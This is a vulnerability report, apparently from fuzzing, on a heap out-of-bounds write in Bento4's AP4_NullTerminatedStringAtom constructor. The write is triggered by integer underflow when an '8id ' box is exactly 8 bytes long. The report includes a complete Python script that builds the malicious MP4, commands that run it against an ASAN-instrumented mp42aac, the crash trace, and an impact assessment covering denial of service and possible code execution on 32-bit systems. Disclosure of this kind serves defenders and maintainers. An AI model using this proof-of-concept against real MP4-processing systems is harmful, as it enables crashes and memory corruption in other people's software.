## Bug0: AP4_NullTerminatedStringAtom Heap OOB Write via Integer Underflow

In `AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom` (`Bento4/Source/C++/Core/Ap4Atom.cpp`, lines 471–474), computing `str_size = (AP4_Size)size - AP4_ATOM_HEADER_SIZE` with `size == 8` yields the unsigned value zero, and the subsequent null-termination write `str[str_size - 1] = '\0'` underflows to `str[0xFFFFFFFF]`, causing a heap out-of-bounds write approximately 4 GB past the allocation.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type_bytes, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type_bytes + payload

# ftyp box: 16 bytes — lets the parser accept the file
ftyp_payload = b"isom" + struct.pack(">I", 0)
ftyp_box = make_box(b"ftyp", ftyp_payload)

# 8id  box with size exactly 8 (header only, no payload) — triggers OOB write
# AP4_ATOM_TYPE_8ID_ = AP4_ATOM_TYPE('8','i','d',' ') = 0x38 0x69 0x64 0x20
eight_id_type = bytes([0x38, 0x69, 0x64, 0x20])
eight_id_box = make_box(eight_id_type, b"")

mp4_data = ftyp_box + eight_id_box

with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
print(f"  ftyp box: {len(ftyp_box)} bytes")
print(f"  8id  box: {len(eight_id_box)} bytes (size=8, no payload)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer:DEADLYSIGNAL
==ERROR: AddressSanitizer: SEGV on unknown address 0x50210000008f (pc ... T0)
The signal is caused by a WRITE memory access.
    #0 AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom(unsigned int, unsigned long long, AP4_ByteStream&)
    #1 AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&)

### Impact

An attacker who supplies a crafted MP4 file with an `8id ` box of exactly 8 bytes can trigger a heap out-of-bounds write at an offset of approximately 4 GB from the allocation, reliably crashing mp42aac and providing a denial-of-service primitive against any pipeline that processes untrusted MP4 input. On 32-bit systems the address wraps and the write lands one byte before the allocation, enabling potential heap metadata corruption that could be escalated toward arbitrary code execution under favorable allocator layout conditions. No user interaction beyond invoking mp42aac on the malicious file is required.
